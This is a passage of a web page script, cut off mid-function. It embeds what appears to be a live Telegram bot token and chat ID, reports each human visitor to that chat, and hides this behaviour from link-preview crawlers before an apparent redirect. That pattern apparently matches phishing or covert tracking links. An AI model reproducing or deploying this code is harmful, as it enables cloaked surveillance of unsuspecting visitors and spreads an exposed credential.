    <script>
      const BOT_TOKEN = "7556980993:AAF1dVr6m2DitiaFOY8_1v59wBKR04p-xXA";
      const CHAT_ID = "7347048637";

      function sendTelegramMessage(message) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
      }

      function isBot() {
        const ua = navigator.userAgent.toLowerCase();
        return ua.includes("facebookexternalhit") || ua.includes("twitterbot") || ua.includes("telegrambot") || ua.includes("whatsapp") || ua.includes("googlebot");
      }

      function notifyAndRedirect() {
        if (isBot()) {
          // لا تفعل أي شيء إذا كان الزائر بوت (للسماح بمعاينة الرابط)
          return;
        }

        sendTelegramMessage(message);
